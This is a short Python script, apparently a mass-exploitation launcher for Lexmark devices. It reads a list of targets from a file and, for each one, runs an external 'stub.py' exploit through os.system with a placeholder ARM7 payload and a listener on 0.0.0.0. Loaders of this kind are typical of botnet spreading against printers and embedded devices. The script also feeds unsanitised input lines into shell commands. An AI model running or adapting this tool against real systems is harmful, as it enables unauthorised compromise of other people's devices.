import os 
import sys 
#lexmark
file_path = sys.argv[1]
payload = "payload here, arm7"
with open(file_path, 'r') as file:
    for line in file:
       
        line = line.strip()
        os.system(f"stub.py -r {line} -l 0.0.0.0 -c {payload}")

print("done")